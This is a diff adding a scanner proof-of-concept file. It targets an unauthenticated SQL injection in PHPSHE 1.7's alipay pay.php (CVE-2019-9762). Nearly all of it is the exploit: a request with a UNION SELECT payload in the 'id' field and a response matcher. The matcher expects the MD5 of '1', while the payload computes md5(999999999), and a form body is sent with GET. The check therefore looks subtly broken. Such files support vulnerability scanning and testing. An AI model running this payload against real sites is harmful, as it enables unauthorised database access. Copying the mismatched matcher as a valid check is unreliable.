@@ -1,0 +1,32 @@
+[info]
+author = "ave"
+description = "验证 PHPSHE 1.7 的 include/plugin/payment/alipay/pay.php 文件中 id 参数是否存在 SQL 注入漏洞。通过构造包含 UNION SELECT 和 MD5 哈希的恶意请求，检测响应中是否出现预期哈希值，从而确认无需认证的 SQL 注入。"
+id = "POC-AVE-2019-0219"
+name = "PHPSHE 1.7 pay.php SQL注入漏洞 PoC"
+severity = "critical"
+tags = ["ave-2019-0219"]
+vuln_id = [
+    "CVE-2019-9762",
+    "AVE-2019-0219",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/include/plugin/payment/alipay/pay.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "id=pay%20where%201=1%20union%20select%201,2,CONCAT(md5(999999999)),4,5,6,7,8,9,10,11,12%23_"
+type = "form"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["c4ca4238a0b923820dcc509a6f75849b"]
